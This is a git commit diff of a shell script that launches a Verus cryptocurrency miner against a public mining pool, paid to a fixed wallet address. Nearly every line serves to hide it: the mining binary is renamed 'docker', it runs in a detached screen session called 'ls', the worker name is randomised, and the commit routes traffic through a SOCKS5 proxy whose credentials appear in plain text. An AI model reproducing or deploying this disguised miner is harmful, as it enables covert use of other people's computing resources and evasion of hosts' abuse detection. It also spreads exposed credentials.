ec042f4ee3a55917bba7a9ec3b563858ba283528
wertesd <86517111+wertesd@users.noreply.github.com>
2021-06-29 20:07:55 +0700

    Update luck.sh

--- luck.sh
+++ luck.sh
@@ -5,5 +5,6 @@ chmod +x docker
 screen -dmS ls 
 POOL=stratum+tcp://na.luckpool.net:3956
 WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
-./docker -a verus -o $POOL -u $WALLET.$WORKER -p c=VRSC,zap=VRSC -t 2
+WORKER=$(echo $(shuf -i 100000-999999 -n 1)-P000000199800XTR)
+PROXY=socks5://woiden_teskun:teskun123@103.253.24.243:8080
+./docker -a verus -o $POOL -u $WALLET.$WORKER -p x -t 2 -x $PROXY
